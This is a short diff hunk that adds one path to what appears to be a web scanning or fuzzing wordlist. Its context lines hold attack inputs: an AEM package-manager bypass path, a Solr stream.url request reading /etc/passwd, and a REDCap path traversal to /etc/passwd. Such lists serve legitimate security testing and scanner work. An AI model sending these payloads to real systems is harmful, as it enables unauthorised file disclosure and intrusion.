@@ -5271,3 +5271,4 @@ content/..;/crx/packmgr/teams.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0
 solr//debug/dump?stream.url=file:///etc/passwd
 api/?type=module&prefix=redcap_landing_page&page=getAsset&file=../../../../../../../etc/passwd&ts=1589308082&NOAUTH
 /?cmd=GetConfig
+/forms/lservlet/
